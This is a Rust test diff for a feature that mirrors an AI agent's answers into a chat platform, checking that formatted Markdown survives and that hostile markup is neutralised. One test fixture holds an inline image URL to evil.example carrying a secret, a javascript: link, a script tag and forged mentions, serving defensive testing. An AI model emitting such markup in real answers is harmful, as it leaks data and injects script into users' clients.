@@ -1065,12 +1065,12 @@ async fn mirror_posts_answer_once_then_clears_receipt() {
     let posts = w.ops("message.post").await;
     assert_eq!(posts.len(), 1, "{posts:?}");
     let t = posts[0]["content"]["text"].as_str().unwrap();
-    assert!(t.contains("answer"), "{t}");
-    let bare = t
-        .chars()
-        .zip(std::iter::once(' ').chain(t.chars()))
-        .any(|(c, prev)| c == '<' && prev != '\\');
-    assert!(!bare, "model text cannot carry active mention syntax: {t}");
+    // (FIX-142) The Markdown is kept; typed neutral tokens never form.
+    assert!(t.starts_with("The *answer* "), "{t}");
+    assert!(
+        !t.contains("<@here>") && !t.contains("<@user:U9>"),
+        "model text cannot carry active mention syntax: {t}"
+    );
     assert!(!t.contains("via"), "dedicated bots carry no attribution");
     let key: String =
         sqlx::query_scalar("SELECT dedupe_key FROM channel_ops WHERE kind='message.post'")
@@ -1089,6 +1089,69 @@ async fn mirror_posts_answer_once_then_clears_receipt() {
         .await
         .unwrap();
     assert_eq!(w.ops("message.post").await.len(), 1);
+}
+
+/// (FIX-142, D-226, D-227) A formatted answer reaches the platform exactly as written.
+#[tokio::test]
+async fn mirror_posts_a_formatted_answer_unchanged() {
+    let w = world().await;
+    let a = w.agent("rex").await;
+    w.presence(w.integ, a, "dedicated", Some("BD1")).await;
+    w.link(w.integ, "U1", w.member).await;
+    w.post(w.integ, "e1", dm("U1", "q", "BD1")).await;
+    let answer = "**Your meetings today:**\n\n- 09:00 `standup` with [Ana](https://cal.example/a)\n  - notes in _the doc_\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n> [!NOTE]\n> remember\n\n```rust\nfn main() {}\n```\n\nSee <https://x.example> and the footnote[^1].\n\n[^1]: Here.";
+    w.finish("done", Some(answer), None).await;
+    let posts = w.ops("message.post").await;
+    assert_eq!(posts.len(), 1, "{posts:?}");
+    // Everything arrives as written except D-270's fifth exception: an autolink is a labelled link
+    // (a platform's preview fetches a bare URL unprompted).
+    let want = answer.replace(
+        "<https://x.example>",
+        "[https://x.example](https://x.example)",
+    );
+    assert_eq!(posts[0]["content"]["text"].as_str().unwrap(), want);
+}
+
+/// (FIX-142) A hostile answer arrives neutralised: no inline image, no script link, no raw
+/// HTML outside the allowlist, no forged mention; `@here` is the only broadcast.
+#[tokio::test]
+async fn mirror_posts_a_hostile_answer_neutralised_and_at_here_as_a_broadcast() {
+    let w = world().await;
+    let a = w.agent("rex").await;
+    w.presence(w.integ, a, "dedicated", Some("BD1")).await;
+    w.link(w.integ, "U1", w.member).await;
+    w.post(w.integ, "e1", dm("U1", "q", "BD1")).await;
+    let answer = "@here deploy done ![x](https://evil.example/?d=secret) [go](javascript:alert(1)) <script>steal()</script> <@user:U9> <#space:C9> @channel";
+    w.finish("done", Some(answer), None).await;
+    let posts = w.ops("message.post").await;
+    assert_eq!(posts.len(), 1, "{posts:?}");
+    let t = posts[0]["content"]["text"].as_str().unwrap();
+    assert!(t.starts_with("<@here> deploy done "), "{t}");
+    assert!(
+        t.contains("[🖼 x (evil.example)](<https://evil.example/?d=secret>)"),
+        "{t}"
+    );
+    assert!(
+        !t.contains("![") && !t.contains("javascript:") && !t.contains("<script"),
+        "{t}"
+    );
+    assert!(
+        t.contains("go steal()"),
+        "the link label and the script's text stay: {t}"
+    );
+    assert!(
+        !t.contains("<@user:U9>") && !t.contains("<#space:C9>"),
+        "{t}"
+    );
+    assert_eq!(
+        t.matches("<@here>").count(),
+        1,
+        "only the standalone @here broadcasts: {t}"
+    );
+    assert!(
+        t.contains("@channel"),
+        "@channel is left for the connector to defuse: {t}"
+    );
 }
 
 #[tokio::test]
